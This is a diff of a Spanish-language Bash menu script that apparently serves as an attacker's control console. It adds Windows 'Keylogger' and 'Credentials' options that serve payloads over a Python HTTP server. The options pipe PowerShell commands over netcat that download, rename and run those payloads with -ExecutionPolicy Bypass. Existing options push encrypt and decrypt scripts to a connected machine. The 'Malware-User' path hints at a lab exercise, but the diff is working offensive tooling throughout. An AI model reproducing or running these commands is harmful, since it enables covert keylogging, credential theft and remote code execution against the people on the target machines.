@@ -5,12 +5,13 @@ while true; do
     echo "========================"
     echo "        MENÚ            "
     echo "========================"
-    echo "1. Encriptar"
-    echo "2. Desencriptar"
-    echo "3. Ejecutar Script para Windows"
-    echo "4. Salir"
+    echo "1. Encriptar - Ubuntu"
+    echo "2. Desencriptar - Ubuntu"
+    echo "3. Keylogger - Windows"
+    echo "4. Credentials - Windows"
+    echo "5. Salir"
     echo "========================"
-    read -p "Seleccione una opción [1-4]: " opcion
+    read -p "Seleccione una opción [1-5]: " opcion
 
     case $opcion in
         1)
@@ -34,7 +35,10 @@ EOF
             cat encriptar.sh | nc -4 -lvp 45000 -s $var
             ;;
         2)
-            
+        
+            # Obtener la dirección IP de la máquina
+            var=$(hostname -I | awk '{print $1}')
+        
             # Crear el script desencriptar.sh
             cat <<EOF > desencriptar.sh
 #!/bin/bash
@@ -54,33 +58,51 @@ EOF
             # Enviar el script desencriptar.sh a través de nc
             cat desencriptar.sh | nc -4 -lvp 45000 -s $var
             ;;
-                3)
+        3)
+        
             # Obtener la dirección IP de la máquina
             var=$(hostname -I | awk '{print $1}')
-            
-            # Crear el script de comandos para el logger
-            cat <<EOF > logger.sh      
-****ipconfig
-ipconfig
-powershell.exe Invoke-WebRequest -Uri "http://$var/exe/keylogger.txt" -OutFile "keylogger.txt"
-powershell.exe -Command "Rename-Item -Path 'keylogger.txt' -NewName 'keylogger.ps1'"
-powershell.exe -File "C:\\Users\\Malware-User\\Music\\keylogger.ps1"
-EOF*****
-         
+        
+            # Crear el script de comandos para el keylogger
+            cat <<EOF > keylogger.sh      
+powershell.exe Invoke-WebRequest -Uri "http://192.168.12.230:8000/exe/keylogger.txt" -OutFile "keylogger.txt"
+powershell.exe -Command "Remove-Item -Path 'potato.ps1' -ErrorAction SilentlyContinue"
+powershell.exe -Command "Rename-Item -Path 'keylogger.txt' -NewName 'potato.ps1'"
+powershell.exe -ExecutionPolicy Bypass -File "C:\Users\Malware-User\Music\wintasks\netcat-1.11\potato.ps1"
+EOF
+            # Ejecutar el servidor HTTP en segundo plano
+            python3 -m http.server 8000 >/dev/null 2>&1 &
             # Esperar a que el cliente se conecte y ejecutar el script en su terminal
             echo "Esperando conexión del cliente..."
-            nc -lvp 45000 -s $var
-            *****echo "Ejecutando los comandos de logger.sh en esta máquina..."
-            bash logger.sh*****
+            # Esperar a que el cliente se conecte y ejecutar el script en su terminal
+            cat keylogger.sh | nc -4 -lvp 45000 -s $var
             ;;
-
         4)
+        
+            # Obtener la dirección IP de la máquina
+            var=$(hostname -I | awk '{print $1}')
+        
+            # Crear el script de comandos para las credenciales
+            cat <<EOF > credentials.sh      
+powershell.exe Invoke-WebRequest -Uri "http://192.168.12.230:8000/exe/credentials.txt" -OutFile "credentials.txt"
+powershell.exe -Command "Remove-Item -Path 'pass.ps1' -ErrorAction SilentlyContinue"
+powershell.exe -Command "Rename-Item -Path 'credentials.txt' -NewName 'pass.ps1'"
+powershell.exe -ExecutionPolicy Bypass -File "C:\Users\Malware-User\Music\wintasks\netcat-1.11\pass.ps1"
+EOF
+            # Ejecutar el servidor HTTP en segundo plano
+            python3 -m http.server 8000 >/dev/null 2>&1 &
+            # Esperar a que el cliente se conecte y ejecutar el script en su terminal
+            echo "Esperando conexión del cliente..."
+            # Esperar a que el cliente se conecte y ejecutar el script en su terminal
+            cat credentials.sh | nc -4 -lvp 45000 -s $var
+            ;;
+        5)
             echo "Saliendo..."
             break
             ;;
         *)
             echo "Opción no válida. Intente de nuevo."
-            ;;
-    esac
+           
+esac
     read -p "Presione enter para continuar..."
 done
